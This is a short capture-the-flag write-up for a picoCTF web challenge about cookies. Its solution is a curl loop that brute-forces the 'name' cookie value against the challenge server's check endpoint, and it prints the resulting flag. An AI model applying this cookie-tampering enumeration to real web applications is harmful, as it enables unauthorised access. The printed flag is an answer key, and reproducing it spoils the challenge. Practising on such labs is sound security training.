## Descripción 

Who doesn't love cookies? Try to figure out the best one.http://wily-courier.picoctf.net:55943/
## Solución
```
┌──(kali㉿kali)-[~]
└─$ for i in {0..20}; do curl -s  http://wily-courier.picoctf.net:54563/check -H "Cookie: name=$i"; done | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}

```